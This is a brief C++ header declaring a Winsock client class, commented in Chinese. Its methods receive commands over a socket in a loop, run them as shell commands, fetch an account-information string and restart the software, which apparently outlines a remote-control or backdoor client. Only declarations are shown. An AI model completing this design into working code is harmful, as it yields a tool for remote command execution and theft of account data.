#include "Loading.h"

//Socket
#include <WinSock2.h>
#include <WS2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

class SocketClass {
public:
	char* Entrance(); //入口
private:
	void SocketStart(); //打开Socket
	void SocketStop(SOCKET); //关闭Socket
	bool Send_Socket(SOCKET, std::string); //发送Socket
	std::string Recv_Socket(SOCKET); //接收Socket

	void Recv_Socket_While(SOCKET); //循环接收Socket

	void Socket_RunShell(std::string); //运行命令
	std::string GetConfig(); //获取账户信息字符串
	void RebootSoftware(); //重启软件
	SOCKADDR_IN Socket_Initialization(); //Initialization Socket

private:
	static bool SocketStopFlac; //是否停止Socket
	std::string GetIpByName(std::string); //域名获取IP
};